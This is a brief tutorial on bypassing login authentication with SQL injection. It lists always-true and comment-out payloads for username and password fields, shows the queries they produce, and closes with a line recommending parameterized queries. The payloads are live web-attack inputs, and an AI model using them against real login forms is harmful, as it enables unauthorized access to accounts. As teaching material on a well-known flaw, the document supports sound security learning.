## SQL Injection Authentication Bypass

SQL Injection can be used to bypass authentication mechanisms by injecting payloads into login forms. These payloads can manipulate the SQL query to always return true, effectively granting access without valid credentials.

### Authentication Bypass Payloads

#### 1. Basic Auth Bypass

- **Payload:**

  ```sql
  0' OR '0' = '0' -- 
  ```

- **Explanation:**

  In this example, the payload is injected into a query where the username is compared. The SQL query might look like this:

  ```sql
  SELECT name, password FROM users WHERE name='0' OR '0' = '0' -- ' AND password='password' LIMIT 0,1
  ```

  The `OR '0' = '0'` condition is always true, so the query will return a result regardless of the actual username and password. This allows an attacker to bypass authentication checks and gain access.

#### 2. Injecting Payloads in Queries

- **Query with Payload:**

  ```sql
  SELECT name, password FROM users WHERE name='0' OR '0' = '0' -- ' AND password='123' LIMIT 0,1
  ```

  Here, the `OR '0' = '0'` condition ensures that the query is always true. Even if the password is incorrect (`'123'`), the condition will still validate the login due to the always-true condition. 

  To demonstrate, you can replace `'0'` with a specific username if needed:

  ```sql
  SELECT name, password FROM users WHERE name='admin' -- ' AND password='123' LIMIT 0,1
  ```

  This query effectively logs in as the `admin` user if the payload is successful.

#### 3. Example of Bypassing Login with Payloads

- **Payloads for Login Form:**

  To test the SQL Injection on a login form, use the following payloads for both username and password fields:

  - **Username:**

    ```sql
    1' OR '1' = '1
    ```

  - **Password:**

    ```sql
    1' OR '1' = '1
    ```

  By entering these payloads into both fields, the query becomes:

  ```sql
  SELECT * FROM users WHERE username='1' OR '1' = '1' AND password='1' OR '1' = '1'
  ```

  The condition `'1' = '1'` is always true, allowing access without valid credentials.

### Summary

SQL Injection can be exploited to bypass authentication by injecting payloads that alter the logic of SQL queries. By using techniques such as always-true conditions or logical OR operators, attackers can log in as any user or bypass authentication altogether. It is essential to sanitize and parameterize SQL queries to prevent such vulnerabilities.

